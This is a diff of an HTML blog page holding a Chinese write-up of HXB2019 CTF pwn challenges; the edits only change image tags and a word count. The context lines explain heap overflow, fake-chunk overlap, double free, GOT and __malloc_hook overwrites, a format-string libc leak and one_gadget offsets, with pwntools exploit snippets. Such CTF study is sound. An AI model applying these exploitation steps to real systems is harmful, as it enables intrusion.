@@ -177,7 +177,7 @@
             </div>
             <h2 class="post-title">HXB2019-pwn题解</h2>
             <div class="post-meta">
-                本文总共3012个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共2853个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -187,7 +187,7 @@
 <li><p>这题秀在没有动态加载libc，而是把libc源码编译了进去，再去掉了符号信息。（调试起来很不方便）</p>
 </li>
 <li><p>漏洞点在edit功能，edit之后会strlen重新赋值size，那么由于内存地址可能的内容的连续，造成溢出。</p>
-<p>{! asset_img  2.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/2.png" title="[]">
 </li>
 <li><p>这里吐槽以下，比赛的时候改文件。原本的存储chunk指针的数组是在bss的，后来改到了stack上。。。</p>
 </li>
@@ -201,11 +201,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x18</span>)               <span class="comment">#size ture larger</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'2'</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'4'</span>*<span class="number">0x18</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#fake size overlapping</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x18</span> + <span class="string">'\x81'</span> + <span class="string">'\n'</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>下面再得到大堆块，就可以修改fd，造成任意地址得到chunk。但是有个问题，就是这里的字节错位怎么找，一般都是在libc里找__malloc_hook前找0x7f，但是这个编译进malloc.c的程序怎么找malloc_hook呢，答案是对比源码找。。</p>
-<p>{! asset_img  4.png []}</p>
-<p>{! asset_img 5.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/4.png" title="[]">
+<img src="/2019/11/10/HXB2019-pwn题解/5.png" title="[]">
 <p>没错就是0x6cb788这里。</p>
 <p>我们看看有没有合适的size。</p>
-<p>{! asset_img 3.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/3.png" title="[]">
 <p>这里，有个位置0x40，似乎可以，但其实返回给我们的是0x6cb78a高于__malloc_hook两个字节；</p>
 <p>还有一个位置，size的低4bytes是0x40，合不合适呢？是可以的，在libc里对size的检查是只检查低4bytes的（第二题也会用到）。所以可以用字节错位得到chunk。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(__malloc_hook - <span class="number">0x10</span>  - <span class="number">6</span>)+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
@@ -220,10 +220,10 @@
 <li><p>程序分析</p>
 <ul>
 <li><p>漏洞点在将ptr指针前移的时候最后一个ptr[19]不会改变，可以double free。</p>
-<p>{! asset_img  7.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/7.png" title="[]">
 </li>
 <li><p>add的时候有’\x00’截断。</p>
-<p>{! asset_img  6.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/6.png" title="[]">
 </li>
 </ul>
 </li>
@@ -244,7 +244,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">#frist try to get got</span></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))		<span class="comment">#这个位置也是利用size只检查低4bytes</span></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'aaa'</span>)</span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x400BCB'</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">0xe</span> + p64(<span class="number">0x4006d0</span>) + p64(<span class="number">0x4006d0</span>))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>这里看一下栈上的情况，确定如何布置格式化字符串。断在free的位置。</p>
-<p>{! asset_img  8.png []}</p>
+<img src="/2019/11/10/HXB2019-pwn题解/8.png" title="[]">
 <p>可以看到libc_start_main。说明我们是可以泄露的只需要调整格式话字符串就OK了。（我这里是%13$p)</p>
 </li>
 <li><p>拿到libc后，就是覆盖__malloc_hook，由于环境的原因，直接用gadget覆盖不行，可以用gadget覆盖realloc_hook，再用libc_realloc+offset覆盖malloc_hook。这里的offset根据onegadget的不同，取值不一；(0xf02a4的是0xd， 0xf1147的是0x14)</p>
